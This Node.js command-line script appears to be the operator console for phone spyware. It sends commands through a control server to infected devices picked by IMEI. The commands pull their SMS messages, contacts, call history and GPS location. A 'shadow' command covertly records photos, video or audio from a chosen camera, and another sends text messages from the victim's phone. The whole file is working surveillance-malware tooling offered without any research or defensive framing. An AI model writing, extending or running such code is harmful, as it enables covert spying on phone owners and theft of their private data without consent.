#! /usr/local/bin/node

let program = require('commander');
let request = require('request');
let HOST = 'http://localhost:3000/';
let cmd2c = require('./command/cmds/command2clients');
const chalkAnimation = require('chalk-animation');

let cmd = new Map()
cmd.set('sms', cmd2c.SEND_SMS_LIST);
cmd.set('contacts', cmd2c.SEND_CONTACTS_LIST);
cmd.set('call', cmd2c.SEND_CALLING_HISTORY);
cmd.set('gps', cmd2c.SEND_GPS);
cmd.set('shadow', cmd2c.SEND_SHADOW);

let type = new Map();
type.set('pic', 'send_pic');
type.set('video', 'send_video');
type.set('audio', 'send_audio');


program
    .version('1.0.0')
    .option('-a,--assassin <assassin>', 'select the command post to the clients if you choose the shadow you should input the cmd -t to choose a type between pic/audio/video [sms,contacts,call,gps,shadow]', 'sms')
    .option('-C,--Clients ', 'show every client info')
    .option('-d,--address <address>', 'input a phone num who you want to send a msg')
    .option('-m,--msg <msg>', 'you should write the msg content, if your command is sms')
    .option('-t,--type <type>', 'select a type between pic/audio/video and you should input the -l to choose the camera lens [pic,audio,video]')
    .option('-c,--client <client>', 'select a client to post the command')
    .option('-l,--lens <lens>', 'which camera lens that you want to open [0,1]')
    .parse(process.argv);

process.emit("./node_modules/.bin/matrix-rain");
if (program.Clients) {
    request(HOST + 'users/users', (error, response, body) => {
        if (body) {
            let data = JSON.parse(body);
            console.log("res", data);
        } else {
            console.log("no client please wait for the boit or restart ur server");
        }
        process.exit();
    });
} else {
    if (!program.client) {
        console.error('ERROR:you should input a type with -c to choose a client that you want to send cmd');
        process.exit();
    }

    if (program.assassin && program.client) {

        let requestBody = {};
        requestBody['command'] = cmd.get(program.assassin);
        requestBody['IMEI'] = program.client;

        if (program.assassin == 'shadow') {
            if (program.type) {
                requestBody['type'] = type.get(program.type);
                if (program.type != 'audio') {
                    if (program.lens) {
                        requestBody['camera'] = program.lens;
                    } else {
                        console.error('ERROR:you should input a type with -l to choose which camera that you want to open');
                        process.exit();
                    }
                }

            } else {
                console.error('ERROR:you should input a type with -t to choose which cmd that you want to send');
                process.exit();
            }
        } else if (program.assassin == 'sms') {
            if (program.address) {
                console.log(program.address);
                requestBody['address'] = program.address;
                if (program.msg) {
                    requestBody['content'] = program.msg;
                } else {
                    console.error('ERROR: cannot send empty msg so you should write content with -m ');
                    process.exit();
                }
            }
        }

        chalkAnimation.rainbow(JSON.stringify(requestBody, null, 4) + '\n \n \n response is : \n');
        request.post({ url: HOST + 'command', form: requestBody }, (error, httpResponse, body) => {
            if (body) {
                console.log(JSON.stringify(body).replace(/\"/g, "").replace(/\\/g, ""));
            }
        });
    }

}

